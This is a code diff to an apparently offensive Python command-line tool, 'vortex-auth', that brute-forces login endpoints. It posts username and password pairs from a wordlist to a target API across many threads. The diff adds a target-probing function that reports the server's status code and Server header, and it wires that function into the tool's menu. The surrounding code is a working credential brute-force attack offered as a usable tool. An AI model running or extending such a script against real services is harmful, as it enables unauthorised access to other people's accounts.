@@ -16,6 +16,16 @@ def print_banner():
     """
     print(BLU + banner + GRN + "\n [ Focus: Speed & Power ]" + RST)
 
+def analyze_mechanism(url):
+    print(f"\n[*] Probing: {url}")
+    try:
+        response = requests.post(url, json={}, timeout=5)
+        print(f"[+] Status Code: {response.status_code}")
+        print(f"[+] Server Header: {response.headers.get('Server', 'Unknown')}")
+    except Exception as e:
+        print(f"[-] Target unreachable: {e}")
+    input("\n[ Press Enter to return to menu ]")
+
 def send_request(target_api, username, password):
     headers = {"Content-Type": "application/json"}
     payload = json.dumps({"username": username, "password": password})
@@ -41,6 +51,7 @@ def execute_test(target_url, username, password_file):
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         for password in passwords:
             executor.submit(send_request, target_url, username, password)
+    input("\n[ Scan completed. Press Enter to return to menu ]")
 
 def main():
     print_banner()
@@ -49,6 +60,7 @@ def main():
         choice = input("\nvortex-auth > ")
         if choice == "1":
             url = input("[?] Target URL: ")
+            analyze_mechanism(url)
         elif choice == "2":
             url = input("[?] URL: ")
             user = input("[?] User: ")
